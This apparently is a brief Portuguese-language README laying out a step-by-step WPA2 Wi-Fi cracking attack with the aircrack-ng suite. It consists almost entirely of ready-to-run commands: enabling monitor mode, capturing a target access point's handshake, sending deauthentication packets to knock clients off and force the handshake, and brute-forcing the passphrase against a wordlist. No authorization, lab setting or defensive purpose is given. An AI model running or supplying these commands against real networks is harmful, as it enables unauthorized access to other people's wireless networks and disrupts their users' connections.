# Wifi-WPA2-Attack--aircrack-ng
![image](https://github.com/user-attachments/assets/0ce8e3d4-c42c-4ca3-8845-268b0c89843f)
![image](https://github.com/user-attachments/assets/a08cb55d-3a44-416b-8fd2-9d746264a2c9)

## 1. Capturar o Handshake
```bash
ifconfig wlan0 down
airmon-ng check kill
airmon-ng start wlan0
airodump-ng --essid-regex "Red*" -a wlan0mon
airodump-ng wlan0mon
mkdir wpa
cd wpa
airodump-ng --bssid BSSIDTARGET -c 11 -w cvr wlan0mon
```
## 2. Desautenticar para forçar o handshake
```bash
aireplay-ng -0 1 -a TARGETBSSID wlan0mon
# -0 = tipo do ataque (deauth)
# 1 = número de pacotes de desautenticação
# -a 00:17:9A:35:53:22 = Access Point (BSSID)
```

## 3. Brute force
```bash
aircrack-ng -b TARGETBSSID -w /usr/share/wordlists/dirb/big.txt cvr-01.cap
```
